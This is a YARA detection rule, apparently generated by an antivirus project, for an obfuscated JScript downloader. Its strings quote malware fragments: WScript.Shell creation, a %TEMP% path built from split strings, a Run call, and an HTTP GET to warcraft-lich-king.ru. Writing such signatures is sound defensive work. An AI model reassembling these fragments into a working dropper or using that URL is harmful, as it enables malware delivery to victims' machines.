rule sig_20160427_ad446fcf3649979d00c99ba9ac3e5d2b {
  meta:
    description = "datamaliciousorder - file 20160427_ad446fcf3649979d00c99ba9ac3e5d2b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0549b72ffef7bd8a8808a2ec4a8eae42c3d8b399ebd190dcbe722ff37abedd98"

  strings:
    $s1  = "function TkkkhDawgv() {return DrznbRqmad[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"LrQSmo9" ascii
    $s2  = "function TkkkhDawgv() {return DrznbRqmad[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"LrQSmo9" ascii
    $s3  = "var DrznbRqmad = function VatrvGyzde() {return ZsomoQvhux[VigjyMsecb](\"WScript\"+\".Shell\");}(), HvufgUigkd = 11;" fullword ascii
    $s4  = "function XlhdaSpdtn(NzgqrQsnco, LcngvKvbqz){PbkwsHwpqv = PbkwsHwpqv * 1; return NzgqrQsnco - LcngvKvbqz;};" fullword ascii
    $s5  = "CmyhaBciuk[UptypGxljr](\"G\" + \"ET\", \"http://warcraft-lich-king.ru/i4ospd\", false);" fullword ascii
    $s6  = "var ZsomoQvhux = this[\"WScript\"];" fullword ascii
    $s7  = "function BczoqMmfmo(){return VvoyuUhxkz + \"\";};" fullword ascii
    $s8  = "if (CmyhaBciuk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function CngjbPqtzi() {return ((ZucfcWtrmf == true) && (ZucfcWtrmf == YaxdtWwfud)) ? 1 : PbkwsHwpqv;};" fullword ascii
    $s10 = "var NawgyVyfyw = new this[\"D\"+\"ate\"]();" fullword ascii
    $s11 = "var ZucfcWtrmf = false;" fullword ascii
    $s12 = "return XlhdaSpdtn(UylnyKyjku, VpwvvNcshk);" fullword ascii
    $s13 = "function FqgwtStmwd(){return VigjyMsecb;};" fullword ascii
    $s14 = "XiiffHebuq = true;" fullword ascii
    $s15 = "function GixyuVwckd()" fullword ascii
    $s16 = "function NddfsFcoga(ZfteeSxwda){DrznbRqmad[\"R\"+\"un\"](ZfteeSxwda, PbkwsHwpqv, PbkwsHwpqv);};" fullword ascii
    $s17 = "}while (TeuupYqjsx);" fullword ascii
    $s18 = "var XiiffHebuq = false;" fullword ascii
    $s19 = "function TjlqnLcpkv(KkbmeEzhnv) {var IsuxlFvoze = (1, 2, 3, 4, 5, KkbmeEzhnv); return IsuxlFvoze;};" fullword ascii
    $s20 = "YaxdtWwfud = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}